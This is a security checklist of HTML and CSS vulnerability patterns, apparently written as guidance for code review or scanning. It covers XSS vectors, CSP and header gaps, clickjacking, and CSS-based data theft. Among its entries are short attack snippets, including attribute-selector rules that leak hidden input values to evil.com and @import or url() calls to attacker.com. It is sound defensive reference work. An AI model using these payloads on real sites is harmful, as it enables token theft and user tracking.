# HTML / CSS — Security Checks

## HTML Vulnerabilities

**Cross-Site Scripting (XSS) Vectors:**
- Inline event handlers with dynamic content: `onclick="handleClick('${userInput}')"` — always escape
- `<script>` tags with dynamically generated content
- `<iframe>` without `sandbox` attribute — full access to parent context
- `<iframe>` with `sandbox="allow-scripts allow-same-origin"` — effectively no sandbox
- `<meta http-equiv="refresh" content="0;url=javascript:...">` — meta-redirect XSS
- `<base href="attacker.com">` — hijacks all relative URLs on the page
- `<object>`, `<embed>`, `<applet>` tags loading external content
- `<svg>` with `<script>` or event handlers — SVG-based XSS
- `<math>` elements with event handlers (MathML XSS)
- `data:` URIs in `src` attributes: `<img src="data:text/html,<script>...">`
- `srcdoc` on iframes with unescaped HTML

**Content Security Policy (CSP):**
- Missing `Content-Security-Policy` header entirely
- `unsafe-inline` in `script-src` — defeats XSS protection
- `unsafe-eval` in `script-src` — allows `eval()` and similar
- Wildcard origins: `script-src *` or `default-src *`
- Missing `frame-ancestors` (clickjacking protection, replaces `X-Frame-Options`)
- `data:` in `script-src` — allows inline script via data URIs
- Missing `upgrade-insecure-requests` for mixed content migration
- Overly permissive `connect-src` allowing exfiltration to arbitrary domains
- Missing `form-action` directive — forms can submit to any origin

**Security Headers (checked in HTML meta or server config):**
- Missing `X-Content-Type-Options: nosniff` — MIME sniffing attacks
- Missing `X-Frame-Options: DENY` or `SAMEORIGIN` — clickjacking
- Missing `Strict-Transport-Security` (HSTS) — downgrade attacks
- Missing `Referrer-Policy` — leaking URLs to third parties
- Missing `Permissions-Policy` (was Feature-Policy) — controlling browser features
- `Access-Control-Allow-Origin: *` on authenticated endpoints

**Forms & Input:**
- `<form>` without CSRF token in hidden field
- `<form action="http://...">` — submitting over plaintext
- `<input type="password">` without `autocomplete="new-password"` or `autocomplete="off"` — browser password caching
- Missing `rel="noopener noreferrer"` on `<a target="_blank">` — window.opener access (tabnabbing)
- `<input type="hidden">` with sensitive data (visible in DOM)

**Integrity & Trust:**
- External scripts without `integrity` attribute (SRI): `<script src="cdn.example.com/lib.js">` — needs `integrity="sha384-..."`
- `crossorigin="anonymous"` required alongside SRI
- Third-party scripts from untrusted CDNs
- Inline scripts that should be externalized for CSP compliance

## CSS Vulnerabilities

**Data Exfiltration via CSS:**
- `background-image: url('https://attacker.com/log?data=...')` — CSS-based tracking/exfiltration
- `@font-face { src: url('https://attacker.com/...')` — font loading as data channel
- Attribute selectors for token extraction:
  ```css
  input[value^="a"] { background: url('https://evil.com/?char=a') }
  input[value^="b"] { background: url('https://evil.com/?char=b') }
  ```
  Brute-forces hidden input values character-by-character
- `@import url('https://attacker.com/malicious.css')` — load external CSS with exfil rules
- CSS `:visited` selector abuse — browser history probing

**UI Redressing & Clickjacking:**
- Transparent overlays: `opacity: 0; position: absolute` covering interactive elements
- `pointer-events: none` on visible elements with hidden clickable layer beneath
- `z-index` manipulation placing invisible elements over legitimate buttons
- `clip-path` / `clip` hiding UI elements while maintaining interactivity
- `transform: scale(0.01)` shrinking elements to invisible but still clickable

**Injection via CSS:**
- `expression()` (IE legacy) — executes JavaScript: `width: expression(alert(1))`
- `url("javascript:...")` in IE/legacy browsers
- `-moz-binding: url(...)` — XBL binding (Firefox legacy)
- CSS `var()` with unsanitized custom property values from user input
- `@charset` manipulation for encoding-based attacks

**Denial of Service:**
- `:not(:not(:not(:not(...))))` — deeply nested selectors causing layout thrashing
- `div div div div div ...` — combinatorial explosion selectors
- `animation` / `@keyframes` with `will-change: transform` on thousands of elements
- `calc()` with deeply nested expressions

## Threat Scan Patterns

**Suspicious Patterns:**
- External resource loading (`url()`) to non-project domains
- CSS files with `@import` chains (can be used to time-delay payload loading)
- Inline styles with `position: fixed/absolute` and `z-index: 99999` — overlay attacks
- Style attributes computing values from JavaScript (`var(--user-controlled)`)
- Hidden iframes: `width:0; height:0; border:none`
- `sandbox` attribute with excessive permissions on iframes
